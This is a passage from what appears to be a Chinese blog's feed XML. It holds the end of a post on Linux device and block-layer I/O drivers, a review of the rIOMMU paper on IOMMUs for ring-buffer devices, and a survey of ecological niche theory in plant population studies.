out_cdev_put;replace_fops(filp, fops);//替换file当中的fops  return ret;}</code></pre><p>这里很奇怪的是，我们并没有看到类似前面提到的<code>driver_register()</code>、<code>device_register()</code>这样的函数。实际上这里并没有真正创建一个设备，而只是说创建了一个接口，所以有这样一个这个问题：<a href="http://blog.csdn.net/luckywang1103/article/details/47860805" target="_blank" rel="noopener">为什么cdev_add没有产生设备节点？</a>对于这个问题，我们应该理解为<code>cdev</code>和<code>driver/device</code>二者是配套工作的，cdev用来和用户交互，而device则是内核中的结构。<br>  另一个问题是，在上面的过程中，似乎没有提及设备文件的创建。实际上，作为一个rookie，那么设备文件常常是用  <code>mknod</code>命令手动创建的。当然，linux自然也提供了自动创建的借口，那就是利用udev来实现，调用<code>device_create()</code>函数。</p><p>当然，这个例子只是为了说明，操作系统的驱动程序是如何工作的，为什么对I/O设备的操作可以抽象成对设备文件的操作，程序在操作I/O文件时，是如何使用正确的操作的。</p><h1>块设备的驱动</h1><p>和字符设备类似，操作系统中的块设备，也是以文件的形式来访问。这里有一个很拗口的问题：磁盘是一个块设备，块设备有一个块设备文件。那么访问块设备文件和访问普通的磁盘上的文件有什么关系呢？<br> 不论是块设备文件还是普通的文件，它们都是通过VFS来统一访问的。只不过对于一个普通文件，它可能已经在RAM中了（高速缓存机制），因此它的访问可能会直接在RAM中进行；但如果说要修改磁盘上的内容，或者文件内容不在RAM中，则也会间接地，通过块设备文件进行访问。这个驱动模型可以用这样一个图表示：</p><p><img src="http://ww.meng.uno/images/%E7%A3%81%E7%9B%98IO/%E5%9D%97%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8.png" alt=""></p><p>这里我们只考虑最底层的情况：内核从块设备读取数据。为了从块设备中读取数据，内核必须知道数据的物理位置，而这正是<strong>映射层</strong>的工作。映射层的工作包括两步：</p><ul>  <li>根据文件所在文件系统的块，将文件拆分成块，然后内核能够确定请求数据所在的块号；</li>  <li>映射层调用文件系统具体的函数，找到数据在磁盘上的位置，也就是完成文件块号，到逻辑块号的映射关系。</li></ul><p>随后的工作在<strong>通用块层</strong>进行，内核在这一层，启动I/O操作。通常一个I/O操作对应一组连续的块，我们把它称为<code>bio</code>，它用来搜集底层需要的信息。</p><p><strong>I/O调度层</strong>负责根据内核中的各种策略，把待处理的I/O数据传送请求，进行归类。它的作用是把物理介质上相邻的数据请求，进行合并，一并处理。</p><p>最后一层也就是通过块设备的驱动来完成了，它向I/O接口发送适当的命令，从而进行实际的数据传送。</p><h1>通用块层</h1><p>通用块层负责处理所有块设备的请求，其核心数据结构就是<code>bio</code>。它代表<strong>一次块设备I/O请求</strong>。</p><pre><code>struct bio {struct bio*bi_next;//请求队列中的下一个biostruct block_device*bi_bdev;//块设备描述符指针unsigned longbi_flags;/* status, command, etc */unsigned longbi_rw;//rw位struct bvec_iterbi_iter;unsigned intbi_phys_segments;//合并后有多少个段unsigned intbi_seg_front_size;unsigned intbi_seg_back_size;atomic_tbi_remaining;//剩余的bio_vecbio_end_io_t*bi_end_io;//bio结束的回调函数void*bi_private;unsigned shortbi_vcnt;//bio中biovec的数量unsigned shortbi_max_vecs;//最多能有多少个atomic_tbi_cnt;//结构体的使用计数struct bio_vec*bi_io_vec;//bio_vec数组};  </code></pre><p>在这个数据结构中，还包含了一个<code>bio_vec</code>。这是什么意思呢？在linux中，相邻数据块被称为一个段，每个<code>bio_vec</code>对应一个内存页中的段。在io操作期间，bio是会一直更新的，其中的<code>bi_iter</code>用来在数组中遍历，按每个段来执行下一步的操作。</p><p><img src="http://www.meng.uno/images/%E7%A3%81%E7%9B%98IO/biovec.gif" alt=""></p><p>那么当通用块层收到一个I/O请求操作时，会发生什么呢？首先内核会为这次操作分配<code>bio</code>描述符，并对它进行填充。随后通用块层会调用<code>generic_make_request</code>，这个函数的作用很明确：它会进行一系列检查和设置，保证bio中的信息是<strong>针对整个磁盘，而不是磁盘分区的</strong>；随后获取这个块设备相关的请求队列q，调用<code>q-&gt;make_request_fn</code>，把bio插入请求队列中去。</p><h1>I/O调度层</h1><p>在块设备上，每个I/O请求操作都是异步处理的，通用块层的请求会被加入块设备的请求队列中，每个块设备都会单独地进行I/O的调度，这样能够有效提高磁盘的性能。</p><p>前面提到，通用块层会调用一个<code>q-&gt;make_request_fn</code>，向I/O调度程序发送一个请求，该函数会进一步调用<code>__make_request()</code>。这个函数的目的，就是把<code>bio</code>放进请求队列当中：（1）如果请求队列是空的，就构造一个新的请求插入；（2）如果请求队列不是空的，但是<code>bio</code>不能合并（不能合并到某个请求的头和尾），也构造一个新的请求插入；（3）请求队列不是空的，并且<code>bio</code>可以合并，就合并到对应的请求中去。注意，bio，请求和请求队列的关系如下：</p><pre><code>-- request_queue|-- request1|-- bio0|-- request2|-- bio1|-- bio2</code></pre><p>而I/O的调度，就是对请求队列进行排序，针对磁盘的特点，降低寻道的次数。这里说说几个常见的算法：</p><ul>  <li>CFQ完全公平队列：默认的调度算法，完全公平排队。每个进程/线程都单独创建一个队列，并且用上面提到的策略进行管理。队列间采用时间片的方式来分配I/O。</li>  <li>Deadline最后期限算法：在电梯调度的基础上，根据读写请求的“最后期限”进行排序，并通过读期限短于写期限来保证写操作不被饿死。</li>  <li>预期I/O算法：与最后期限类似，但是在读操作时，会预先判断当前的进程是否马上会有读操作，并且优先地进行处理。</li>  <li>NOOP：适用于固态硬盘，不进行任何优化。</li></ul><p>总而言之，I/O调度层的作用，就是把请求的队列重新排序，并逐个交给块设备驱动程序进行处理。</p><h1>块设备驱动程序</h1><p>I/O调度层排序好的请求，会由块设备的驱动程序来处理。同样，块设备也遵循着我们前面提到的驱动程序模型：块设备对应一个<code>device</code>，而驱动程序对应了一个<code>device_driver</code>。对于块设备来说，驱动程序也要通过<code>register_blkdev()</code>注册一个设备号。随后，驱动程序要初始化<code>gendisk</code>描述符，以及它所包含的设备操作表<code>fops</code>。在此之后，是“请求队列”的初始化，以及中断程序的设置：要为设备注册IRQ线。最后要把磁盘注册到内核（<code>add_disk</code>）,并把它激活。</p><p>当一个块设备文件被<code>open()</code>时，内核同样也要为它初始化操作。对于块设备来说，其默认的文件操作如下：</p><pre><code>const struct file_operations def_blk_fops = {.open= blkdev_open,.release= blkdev_close,.llseek= block_llseek,.read= new_sync_read,.write= new_sync_write,.read_iter= blkdev_read_iter,.write_iter= blkdev_write_iter,.mmap= generic_file_mmap,.fsync= blkdev_fsync,.unlocked_ioctl= block_ioctl,#ifdef CONFIG_COMPAT.compat_ioctl= compat_blkdev_ioctl,#endif.splice_read= generic_file_splice_read,.splice_write= iter_file_splice_write,};</code></pre><p><code>dentry_open()</code>方法会调用<code>blkdev_open()</code>。它（1）首先会获取块设备的描述符：如果块设备已经打开，则可以通过inode-&gt;i_bdev直接获取，否则则需要根据设备号去查找块设备描述符。（2）获取块设备相关的<code>gendisk</code>地址，<code>get_gendisk</code>是通过设备号来找到gendisk的。（3）如果是第一次打开块设备，则要根据它是整盘还是分区，进行相应的设置和初始化。（4）如果不是第一次打开，只需要按需要执行自定义的<code>open()</code>函数就行了。</p><h1>补充：I/O的监控方式</h1><ul>  <li>轮询：CPU重复检查设备的状态寄存器，直到寄存器的值表明I/O操作已经完成了。</li>  <li>中断：设备发出中断信号，告知I/O操作已经完成了，数据放在对应的端口，当数据缓冲满了时，由CPU去取，CPU需要控制数据传输的过程。</li>  <li>DMA：由CPU的DMA电路来辅助数据的传输，CPU不需要参与内存和IO之间的传输过程，只需要通过DMA的中断来获取信息。DMA能够在所有数据处理完时才通知CPU处理。</li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/d0c0e94a/">http://home.meng.uno/articles/d0c0e94a/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      I/O体系结构
虚拟文件系统利用底层函数，调用每个设备的操作，那么这些操作是如何在设备上执行的，操作系统又是如何知道设备的操作是什么的呢？这些是由操作系统决定的。
我们知道，操作系统的工作，是依赖于数据通路的，它们让信息得以在CPU、RAM、I/O设备之间传递。这些数据通路称为 总线。这就包括数据总线（PCI、ISA、EISA、SCSI等）、地址总线、控制总线。I/O总线，指的就是用于CPU和I/O设备之间通信的数据总线。I/O体系的通用结构如图所示：



那么CPU是如何通过I/O总线和I/O设备交互呢？这首先得从内存和外设的编址方式说起。第一种是“独立编址”，也就是内存和外设分开编址，I
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="I/O" scheme="http://home.meng.uno/tags/I-O/"/>
    
  </entry>
  
  <entry>
    <title>rIOMMU：Efficient IOMMU for I/O Devices that Employ Ring Buffers</title>
    <link href="http://home.meng.uno/articles/51c782dd/"/>
    <id>http://home.meng.uno/articles/51c782dd/</id>
    <published>2016-06-22T12:28:00.000Z</published>
    <updated>2020-12-02T02:04:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1>文章内容理解</h1><h2 id="作者写作背景">作者写作背景</h2><p>在I/O设备开始与CPU异步直接与主存交换信息（DMA时代）开始时，DMA使用物理地址直接存取，这就给系统带来了很多诸如劣质甚至恶意设备影响，造成系统崩溃……等麻烦，在这种情况下，对I/O设备的存取统一管理的单元——输入输出存储管理单元（IOMMU）应运而生。随着设备带宽的提高，那些像网卡和PCIe SSD控制器等高带宽设备可以与系统通过一个环型缓冲器相互影响，于是一种带有环形的缓冲器能够分层、平滑地替换虚拟地址的rIOMMU成了研究的重点。这种rIOMMU能高达7.56倍地提高普通IOMMU的效率，是没有IOMMU的0.77—1.00倍。</p><h2 id="文章结构">文章结构</h2><p>该文章从以下七个部分论述：</p><ul>  <li>    <p>摘要：简述本次论文的主要内容；</p>  </li>  <li>    <p>介绍：向读者介绍什么是IOMMU以及什么是Riommu其他缩写的概念；</p>  </li>  <li>    <p>背景：在什么情况下，作者提出用rIOMMU改进原有IOMMU的：</p>    <ul>      <li>首先讲OS的DMA保护；</li>      <li>接着讲IOMMU的设计与提升作用；</li>      <li>最后提出rIOMMU的概念。</li>    </ul>  </li>  <li>    <p>安全代价：讲解OS与IO设备的关系与保护方式</p>  </li>  <li>    <p>设计：这是作者主要论述的部分，也是本文的核心，从以下三个方面论述：</p>    <ul>      <li>数据结构</li>      <li>硬件实现</li>      <li>软件实现</li>    </ul>  </li>  <li>    <p>评估：从7个模式分别测试该设计的可行性，又分为方法与结果两个部分论述</p>  </li>  <li>    <p>总结</p>  </li></ul><p>下面直接进入文章的设计部分：</p><h2 id="数据结构">数据结构</h2><p>作者从软件、硬件两种方式来组合实现rIOMMU,所以数据结构不得不是最先介绍的东西了。我将以代码与文字结合的方式介绍：  <img src="http://www.meng.uno/images/iommu/3.png" alt="IOMMU"></p><p>以上四个结构体所展示的数据结构，都是硬件软件公用的，他们都被rIOMMU用来转换虚拟地址，被操作系统调用。接下来定义一个只有硬件会使用的结构体：</p><p><img src="http://www.meng.uno/images/iommu/4.png" alt="IOMMU"> ## 硬件处理</p><p>首先，在与rRING相连的rIOTLB_entry的IOVA中寻找e，如果e不存在rIOMMU就搜索表，用上面定义的数据结构，找到rPTE，并插入rIOTLB一个匹配的entry，同时使表移动确保e.rpte是rPTE中给定的rIOVA。</p><p>其次，如果e已经初始化在rIOTLB被找到，rIOMMU匹配每一个IOVA和e，并且实时更新e。</p><p>然后，检查IOVA.offset如果出错，会造成rIOMMU启动I/O默认页（IOPF）,当然这并不是所希望的，未出错时，最终该offset会加到rPTE.phys_addr上形成虚拟地址的转换。</p><p>最后还有关于错误的一些处理，在此不再赘述。</p><h2 id="软件处理">软件处理</h2><p>说完了硬件上的处理，接下来该软件上的操作了，说是软件其实就是设备的驱动程序、映射函数等底层的软件，这部分的处理和Linux中IOMMU的基准处理相似。</p><p>这一部分主要是处理映射的问题，具体就是将数据结构中定义的每个结构体的各个域之间建立联系。映射给每个设备一个ring ID，一个映射的物理地址，它包含两个部分：</p><ol>  <li>在ring的尾部分配一个环入口rPTE，然后更新上面数据结构提到的tail/nmapped域；</li>  <li>当rPTE初始化后，首先确保其内容更新对rIOMMU是可见的，它的返回状态是入口的索引，而且这个ring ID是由IOVA所得到的。</li></ol><p>这一部分也同样有错误处理，在此不再赘述。</p><h1>可行性分析</h1><h2 id="可行性评估">可行性评估</h2><p>在读了这一篇关于优化IOMMU的文章后，我在网上寻找了一下，相关的研究进展情况，发现早在很多年前像Intel、AMD等处理器生产商早就有关于IOMMU的应用，但是在像本文所讲的rIOMMU还没有得到应用过，也就是说文章现在所言皆是理想的情况。</p><p>在文章的后半部分，作者也从“方法”、“实验执行”、“基准”等方面做了很多测试，其中在“方法”模块采用：①strict，②strict+，③defer，④defer+，⑤riommu-，⑥riommu，⑦none其中模式，可以说是比较准确的了下图及下表展示所有测试结果：</p><p><img src="http://www.meng.uno/images/iommu/1.png" alt="IOMMU"></p><p><img src="http://www.meng.uno/images/iommu/2.png" alt="IOMMU"></p><p>通过结果可见，当运行“需求-响应”（RR）模式是，相对于普通IOMMU，提升不是多么的明显，但是在其他方面，结果还是挺理想的。</p><h2 id="创新之处">创新之处</h2><p>作者在测试部分将模拟方法分成7个等级，基本上模拟了所有的正常可能情况，有力证明了本次实验的成功。</p><p>作者在进行设计之初，分析了现有的DMA与IOMMU，然后提出自己的设计，使我们对总体设计有一个整体认识，也使的作者的设计比较容易接受。</p><p>在设计上，作者不仅考虑到硬件，同时对软件也进行了设计，而且设计过程相当明细，用实际的代码来解释，使设计极具可行性。</p><h1>设计存在的不足分析</h1><ul>  <li>我认为作者在设计时并未考虑这样设计所带来的结构复杂性，也未对实际的能耗做评估，也许可能会由于总线分配问题而没法嵌入系统。</li>  <li>作者虽然提到rIOMMU在对有错误的DMA设备的保护的作用，但是没有给出具体的保护方案。</li>  <li>我想到既然通过环形缓冲器能解决速度的问题，那么会不会带来其他的弊端，例如：某次传输没有传输完就被后一次的覆盖掉或者当环形缓冲器中有错误，没法处理时会不会发生DMA总是在那里占用总线而又没有实际的数据传输。</li>  <li>既然是环形缓冲器，那么当传输数据是暂时性的，而且又没能在有效的时间范围内进入环形缓冲器，那么是不是就有冲掉的风险。</li></ul><h1>针对不足的改进意见</h1><p>在上一部分我浅显地提出了自己认为是不足的地方，在此仅仅做些自己认为合理的改进意见。不能保证我的观点是完全正确，但是这确实是我自己对相关问题的认识所得。</p><ol>  <li>作者可以增加关于能耗的测试，作者提到这样的rIOMMU确实在某些方面比IOMM要有效得多，但是能耗是不是也如此呢？作者应该往这方面做些必要的测试（由于水平有限，所以只能借助作者之手完成这项测试）。</li>  <li>既然rIOMMU对设备有保护作用，那么其作用具体体现在哪呢？仅仅是在对错误数据的处理上，远远不足以满足现在设备的要求，例如，当某设备出错，重复发送某信息时，作为向主存传输信息的接口，应该如何处理呢？我认为可以从软件上进行相关判断，我觉得这将是这类IOMMU值得改进的地方。</li>  <li>我觉得环缓冲器还应该增加错误信息清除能力，当出现出错信息时，能有效地将其清除并且不影响其他设备的正常传输。</li>  <li>每个环形缓冲器都会有数量“size”的限制，像用尽这种现象应该是尽量避免的。也许可以通过取一个大大的“buffer”值来基本解决这一问题，但是将造成空间消耗严重，我觉得更好的解决办法是，修改设计，使设计能够容纳多个环缓冲器，当然不是每个环每次都会使用，当第一个环占满并且还有数据需要缓冲时，才会调用第二个环……在这种设计上，我觉得将会增加很多判断，设计空间的动态分配等问题。</li></ol><h1>附录</h1><p>在此将本文所有用到的英文缩写做一下梳理：</p><ul>  <li>    <p>IOMMU: Input/Output Memory Management Unit 输入输出存储管理单元</p>  </li>  <li>    <p>rIOMMU: IOMMU Employed Ring Buffers 带环缓冲器的IOMMU</p>  </li>  <li>    <p>IOTLB: I/O Translation Lookaside Buffer 用于IOMMU的块表</p>  </li>  <li>    <p>IOVA: I/O Visual Address IO虚拟地址</p>  </li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/51c782dd/">http://home.meng.uno/articles/51c782dd/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      文章内容理解
作者写作背景
在I/O设备开始与CPU异步直接与主存交换信息（DMA时代）开始时，DMA使用物理地址直接存取，这就给系统带来了很多诸如劣质甚至恶意设备影响，造成系统崩溃……等麻烦，在这种情况下，对I/O设备的存取统一管理的单元——输入输出存储管理单元（IOMMU）应运而生。随着设备带宽的提高，那些像网卡和PCIe SSD控制器等高带宽设备可以与系统通过一个环型缓冲器相互影响，于是一种带有环形的缓冲器能够分层、平滑地替换虚拟地址的rIOMMU成了研究的重点。这种rIOMMU能高达7.56倍地提高普通IOMMU的效率，是没有IOMMU的0.77—1.00倍。

文章结构
该文章从以下
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="IOMMU" scheme="http://home.meng.uno/tags/IOMMU/"/>
    
      <category term="Buffer" scheme="http://home.meng.uno/tags/Buffer/"/>
    
  </entry>
  
  <entry>
    <title>生态位之我见</title>
    <link href="http://home.meng.uno/articles/85c6ef64/"/>
    <id>http://home.meng.uno/articles/85c6ef64/</id>
    <published>2016-06-18T16:01:11.000Z</published>
    <updated>2020-12-02T01:45:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>生态位已是国内外生态学领域广泛使用的术语和研究热点 。自进入 20 世纪 90 年代以来, 生态位 ( niche) 这一概念在生态学界受到了前所未有的关注, 这是继 20 世纪 70 年代生态位理论研究热之后的第 2 个发展高潮。由于物种多样性、物种竞争、群落结构和功能及演替与种群进化、群落物种积聚原理都以生态位理论为基础, 因此生态位理论逐渐成为生态学中重要的基础理论之一, 受到了国内外学者的广泛重视。然而, 令人遗憾的是迄今为止在生态位研究领域尚未形成一套系统完整的为各国学者所共同接受的理论框架,  许多学者也对生态位的概念长期争论不休, 所以对生态位的定义也是多样化的。现将生态位理论及其在植物种群研究中的应用现状加以综述, 以便为今后的研究提供有益参考。</p><h1>生态位理论及其发展</h1><p>早在 1894 年密执安大学的 Streere 在解释鸟类物种分离而居于菲律宾各岛现象时对生态位就很感兴趣, 但未作任何解释。1910 年, Johnson 最早使用了生态位一词:同一地区的不同物种可以占据环境中的不同生态位 。 可惜他没有对生态位进行定义, 未将其发展成一个完整的概念。Grinnell ( 1917, 1924, 1928) 在研究加利福尼亚长尾鸣禽的生态关系时使用生态位术语并首次给以定义, 他把生态位定义为：恰好被一个种或一个亚种所占据的最后分布单位( ultimate distributional  unit) 。这一定义虽然注意到了种的结构和功能上的作用, 但更加强调种的空间分布的意义, 因此被称为空间生态位 。动物生态学家 Charles Elton( 1927) 认为:一种动物的生态位表明它在生物环境中的地位及其与食物和天敌的关系。以后他又说过: 一个动物的生态位在很大程度上决定于它的大小和取食习性。他给生态位下的定义是：指物种在生物群落中的地位和角色 。他特别强调物种在群落营养关系中的角色, 后人将他的定义称为：功能生态位 。</p><p>20 世纪 30 年代和 40年代, 关于生态位概念的研究处于相对沉寂时期。直到 50年代, 对生态位的概念研究重新升温, Odum( 1952) 认为, 生态位不仅包括有机体的群落类型、生境和物理条件, 而且还包括某些它与群落所有其他成分有关的要素, 它本身在群落动态中所起的作用。Hutchinson( 1957) 引入数学中点集理论, 把生态位看作是一个生物单位( 个体、种群或物种) 生存条件的总集合体 。他从空间、资源利用等多方面考虑, 对生态位概念予以数学的抽象, 提出了生态位的多维超体积模式。所谓的多维资源空间的超体积,  这不仅包含了原来的物理分布空间, 而且还包括温度、湿度、pH 值等衡量其栖息地的一些其它指标。Hutchinson 后来在此基础上提出了基础生态位和现实生态位两个概念。多维超体积概念为现代生态位理论研究奠定了基础。</p><p>1959 年 Odum 把生态位定义为：一个物种在群落和生态系统中的位置和状态, 而这种位置和状态则决定了该生物的形态适应、生理反应和特有行为。他曾强调指出: 一个生物的生态位不仅决定于它生活在什么地方, 而且决定于它干些什么。Odum 曾形象地将栖息地比喻为是生物的住址, 而将生态位比喻为生物的职业。Whittaker ( 1973)等把前人关于生态位的概念归纳为三个涵义, 即一个物种在群落中所起的功能位置或角色( 功能的涵义) ; 反映种在群落中的分布关系( 生境的涵义) ; 上述两者概念的结合即功能与生境(  利用的资源) 结合起来的涵义 。May ( 1976) 把生态位概括为某物种究竟怎样生活在地球上的诸生态因子中。而有的植物学家( 如 Grubb, 1977) 视生态位为植物与所处环境的总关系 。Pianka( 1983) 认为一个生物单位( 个体, 种群或物种) 的生态位就是该生物单位适应性的总和 。王刚等( 1984) 对哈奇森的工作进行了改进, 给出了生态位的一个广义定义: 一个种的生态位是表征环境属性特征的向量集到表征种的属性特征的数集上的映射关系。</p><p>Colinvaux( 1986) 提出物种生态位的概念, 即生态位是物种为了满足获得资源、生存机会和竞争能力等一系列需要所具有的特殊能力。在前人研究的基础上, 刘建国和马世俊等( 1990) 提出了扩展的生态位理论, 根据生态位的存在与非存在形式, 以及生态位的实际和潜在被利用状态可将生态位分为存在生态位( 包括实际生态位和潜在生态位) 和非存在生态位, 他们认为生态位是在生态因子变化范围内, 能够被生态元实际和潜在占据、利用或适应的部分, 拓展了生态位的研究范围 。Mathew A Leibold  ( 1995) 从生物对环境需求与影响的角度, 提出需求生态位与影响生态位及由以上两者结合形成总生态位。Whittaker 首先将生态位理论应用于研究森林生态学中 。</p><p>张光明等认为生态位所描述的主体对象实践上应该是种群; 生态位本质上是指物种在特定尺度下在特定生态环境中的职能地位, 包括物种对环境的要求和影响两个方面及其规律; 离开尺度去谈生态位没有真正价值。他们认为一定生态环境里的某种生物在其入侵、定居、繁衍、发展以至衰退、消亡历程的每个时段上的全部生态学过程中所具有的功能地位, 称为该物种在该生态环境中的生态位。</p><p>朱春全 ( 1997) 在提出生态位的态势理论与扩充假说时认为生态位应当包含两个方面: 一是生物单元的态, 二是生物单元的势, 生物单元的生态位是该生物单元态和势之和与所有被研究的生物单元态和势之和的比值, 即生态位是生物单元在特定生态系统中与环境相互作用过程中所形成的相对地位与作用。他认为前人的研究均是从生物单元的生态环境方面来表述其生态位的, 然而, 对于任何生物单元的研究都是对特定时刻、特定生物群体的状态描述, 当前实际占据环境部分不能反映该生物单元所经历的环境变化的所有特征, 而且, 生物单元所占据的生态因子范围受多种随机因素的影响,  因此, 特定时刻某生物单元所占据的环境范围对于该生物单元的生态作用没有实际意义。</p><p>由以上不难看出, 不同的学者对生态位的定义并不统一。但尤以 Grinnell 的空间生态位、Elton 的功能生态和Hutchinson的多维超体积生态位最具代表性。Whittaker等曾对各家定义做出类似的划分。朱春全提出的态势理论具有普适性, 并且综合了生命系统所具有的共性, 既适用于人类社会, 也适用于其它所有的生命类群, 是自然科学和社会科学的高度综合 。现代生态位理论是以 Hutchinson 的多维超体积概念为基础的,但至今尚未形成一个使广大生态学者公认、堪可适用的生态位概念及其理论体系。</p><h1>生态位理论在植物种群研究中的应用</h1><p>生态位理论对于认识植物种群种内或种间竞争具有重大意义。</p><p>竞争排斥现象是普遍存在的, 如森林中常见的自然稀疏现象 , 生态位重叠既可以体现种群对环境资源的利用状况, 又能反映种群间分布地段的交错程度 。生态特征相似或具有近相似环境要求的植物种群, 在群落中生态位重叠较大 。生态位宽度较大的种群由于对资源利用能力较强, 分布较广而与其它种群间的生态位重叠较大; 生态位宽度较小的种群与其它种群的生态位重叠较小; 但具有较大生态位宽度的种群之间的生态位重叠并不一定高, 具有较小生态位宽度的种群之间的生态位重叠并不一定低; 究其原因, 可能是这些种群由于它们之间的利用性竞争而使它们经常出现在一起,  例如不同层次的树种, 对光要求是不同的。同一层次的种群具有较高的生态位重叠值, 其结果是由于利用性竞争引起还是由于干扰性竞争引起的, 这要根据具体情况而定, 有的学者指出生态位重叠只与利用性竞争有关而与干扰性竞争无关。这也许与森林类型有关, 如热带森林跟温带森林情况可能就会不一样。</p><p>刘金福 等在研究格氏栲林主要种群生态位时认为对重叠较大的种群存在两种可能: 一是树种间共享资源的同时存在竞争关系, 二是树种间资源利用相似的同时彼此促进关系。奚为民 认为生态位重叠作为衡量种间生态相似性的指标和种间竞争存在着一定的联系, 生态位重叠和竞争之间经常可能是一种相反的关系, 广泛的重叠实际上可能与减低竞争相关联。有学者认为生态位互利性重叠现象在自然界中是不存在的。还有学者认为种群间的正联结性越强其生态位重叠值就大, 种群间的负联结性越强则重叠值就越小。林思祖等将生态位重叠与竞争的关系归纳为三点:  生态位重叠与竞争成正相关; 生态位重叠与竞争成负相关; 生态位重叠与竞争不成相关; 他认为生态位重叠与竞争的关系在很大程度上受种群间的生物学特性的左右。</p><p>奚为民 认为具有较宽生态位的植物种群, 其一定具有较强的生态适应性, 因而生存机会多, 分布范围也较广; 反之则生存机会少, 分布范围也较窄。丁易 等却认为当资源供应不足时, 作为利用资源多样化的泛化物种( 即生态位较宽的物种) 具有更强的生态适应、更广的分布范围和更大的存活机会, 当资源供应丰富时, 在局域小生境范围内, 特化物种( 即生态位较窄的物种) 具有更高的资源利用效率, 其竞争能力强于泛化物种。 生态位理论对于指导林业生产和植物种群改良具有实践意义。</p><p>生态位重叠与种群竞争的关系是一个十分复杂的问题, 在林业上种间配置时, 我们应该要考虑各个种群的生态位宽度、种群之间的生态位相似性比例和生态位重叠, 以及它们之间是否有利用性竞争的生态关系, 如果是竞争性的生态关系, 那么至少要求将某一维度的资源不要重叠。总之, 我们要使所建立的人工群落处与一种高度和谐的系统之中。在植物种群改良时, 我们应充分考虑到种群的生态特征, 避免引入种与原有种之间产生较大的生态位重叠, 防止种群间出现激烈竞争; 建立引入种的最适生长环境, 获取优势生长, 使各种群均能有效地利用资源,  提高群落的初级生长力。</p><p>郭全邦等认为基础生态位宽的种群能在严酷的生境中生存, 基础生态位窄的种群适宜于生长在资源丰富、群落结构复杂的生境中。因此, 在荒地上建造植被, 或改善恶劣的环境, 一般应选择基础生态位较宽的种群; 为了加快植被的演替或搞种群配置, 则应合理地选择, 引入基础生态位较窄的种群。林思祖等认为不同资源空间的主要种群生态位宽度发生变化, 说明了不同资源的物种生态适应性不同。综上所述, 在林业生产上, 我们应该既要考虑到种群间的竞争排斥原理, 又要考虑到种群生态位宽度对植物生存的影响。</p><h2 id="生态位理论是解释森林群落演替动态的方法之一">生态位理论是解释森林群落演替动态的方法之一</h2><p>种群的资源利用能力是种群分布与群落演替的内在动力。随着群落的发展或演替, 种群的生态位宽度会发生变化, 通过不同时期进行种群生态位宽度的测定, 可以深入了解整个群落的发展动态。实际生态位可用于种内、种间的比较, 作为基础生态位研究的资料, 也可用于探索种群和群落的动因等; 基础生态位不同于原始生态位( 即竞争前生态位或生理幅度) , 可为群落结构和动态的研究提供线索。在群落演替过程中, 当种群大小与资源的可利用程度相对平衡时, 资源可满足种群的需要而使其稳定, 不表现出生态位释放和压缩; 当种群大小超过资源的可利用程度时,  资源短缺, 种群衰退。同时, 种群的增长将加快它对环境的影响, 资源的耗损加速, 限制其原有种群的发展, 压缩其实际生态位, 为其他物种的生态位释放奠定基础。</p><p>吴大荣 研究福建罗卜岩闽楠林优势树种生态位后发现: 大部分的常绿阔叶树种具有较大的生态位宽度值, 而落叶阔叶树种则呈现较小的生态位宽度值。这一研究结果有助于理解由落叶阔叶树种为主的常绿落叶阔叶林向中亚热带典型常绿阔叶林演替过程中优势种群的生态适应性变化规律。吴明作 等通过研究河南栓皮栎林主要种群的生态位后发现, 随着资源轴的增加, 总的生态位宽度减小; 说明了多维资源轴利用中, 基础生态位中可实现的部分减少, 其原因有待进一步研究。</p><h2 id="小结">小结</h2><p>从Grinnell( 1917) 首次给出生态位的定义到现在, 生态位理论取得了长足的发展。现代生态位理论的研究集中在生态位重叠、生态位宽度和生态位相似性比例等生态位测度的定量研究上。我国许多学者自 80年代以来对生态位理论进行了大量卓有成效的研究, 如刘建国( 1990) 提出的扩展的生态位理论、朱春全( 1997) 提出的生态位态势理论与扩充假说等等。虽然至今为止尚未形成一个使广大生态学者公认、堪可适用的生态位理论, 但生态位理论已经受到国内外广大生态学者的特别关注, 发展前景广阔。生态位理论很有希望发展成为既贯穿于生态学各理论分支之中又自成体系的重要的生态学基础理论之一。</p><p>生态位与植物种群是一一对应的, 某一特定的植物种群要求某一特定的生态位, 反过来某一特定的生态位只能容纳某一特定的植物种群 。生态位理论在植物种群生态学的定量研究中具有现实意义 。</p><p>生态位理论在植物种群研究中有重要而广泛的应用, 通过对植物种群之间生态位重叠、生态位相似性比例及生态位宽度的计算, 可以使我们更深入地认识植物种群内或种间的竞争, 这对我们深入理解植物种群在群落中的地位和作用也提供了帮助。生态位理论对于我们林业生产和种群改良也具有重要的现实指导意义, 它为解释森林群落演替动态机理提供了一个重要方法。</p><h1>浅显的认识</h1><p>由于人口的急剧增多, 城建规划不合理, 建筑家随心所欲地建造房屋, 城市在时间上、空间上不断改变着面貌, 出现了一系列影响人民生活、工作, 影响经济持续、稳定、协调发展的生态问题。生态位已是国内外生态学领域广泛使用的术语和研究热点 。从Grinnell( 1917) 首次给出生态位的定义到现在, 生态位理论取得了长足的发展。生态位不仅包括有机体的群落类型、 生境和物理条件 , 而且还包括某些它与群落所有其它成分有关的要素 ,它本身在群落动态中所起的作用。</p><ul>  <li>生态位数量</li></ul><p>生态位的数量与生态系统的气候，地理和生物因素有关。相应的物种数会因这些因素的差异导致有很大的不同。极地，例如格陵兰的冰川，南极洲或是高原的生态位数就不及热带的原始森林或是珊瑚礁的多。</p><ul>  